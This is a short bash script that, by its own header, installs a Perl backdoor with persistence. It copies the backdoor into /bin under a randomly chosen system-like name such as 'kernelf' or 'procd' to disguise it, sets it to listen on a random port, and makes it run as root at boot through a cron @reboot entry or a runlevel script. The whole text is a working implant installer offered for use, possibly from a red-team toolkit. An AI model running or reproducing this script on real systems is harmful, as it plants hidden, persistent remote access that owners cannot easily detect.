
# Script to  install a perl backdoor ( with persistence)  and run it on a rando port 

port="$(shuf -i 1000-65535 -n 1 )"
names=(sysd iproc devtool runtime procd etcd modrun kernelf keyboardd externalp portman pointd ptr dre dss)
name=${names["$(shuf -i 0-14 -n 1)"]}
files=("/etc/rc0.d/K11$name" "/etc/crontab" "/etc/cron.d/$name")
n=$(shuf -i 0-2 -n 1)
file=${files[$n]}
cp ./src/misc/perl-backdoor.pl /bin/$name
sed -i "s/18080/$port/g" /bin/$name
chmod +x /bin/$name

if [ $file == "/etc/cron.d/$name" ] || [ $file == "/etc/crontab" ]; then 
	echo "@reboot root /bin/$name" >> $file 
else 
	echo "/bin/$name" > $file
	chmod +x $file 
fi
